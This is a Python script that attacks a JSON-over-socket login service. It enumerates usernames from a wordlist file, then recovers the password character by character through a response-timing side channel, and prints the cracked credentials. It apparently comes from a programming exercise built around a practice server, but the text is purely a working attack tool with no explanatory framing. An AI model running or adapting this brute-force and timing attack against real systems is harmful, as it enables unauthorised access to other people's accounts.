import json
import socket
import sys
from datetime import datetime


def yield_variants_logins(file):
    with open(file, 'r') as logins_list:
        for log_in in logins_list:
            yield log_in.strip('\n')


args = sys.argv
ip = str(args[1])
port = int(args[2])
buffer_size = 1024
CONNECTION_SUCCESS = 'Connection success!'
WRONG_PASSWORD = 'Wrong password!'
EXCEPTION_DURING_LOGIN = 'Exception happened during login'
password = ''
i = 0
char_set = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

my_socket = socket.socket()
address = (ip, port)
my_socket.connect(address)
logins = yield_variants_logins('logins.txt')
login_password_json = {
    "login": "",
    "password": " "
}
while True:
    try:
        login = next(logins)
        login_password_json["login"] = login
        my_socket.send(json.dumps(login_password_json).encode())
        response = json.loads(my_socket.recv(buffer_size).decode())
        if response["result"] == WRONG_PASSWORD:
            break
    except StopIteration:
        print('StopIteration')

while True:
    start = datetime.now()
    piece = char_set[i]
    if i + 1 == 62:
        i = 0
    else:
        i += 1
    login_password_json["password"] = password + piece
    my_socket.send(json.dumps(login_password_json).encode())
    response = json.loads(my_socket.recv(buffer_size).decode())
    finish = datetime.now()
    difference = finish - start
    if difference.total_seconds() > 0.1 and response["result"] == WRONG_PASSWORD:
        password += piece
    if response["result"] == CONNECTION_SUCCESS:
        print(json.dumps(login_password_json))
        exit()
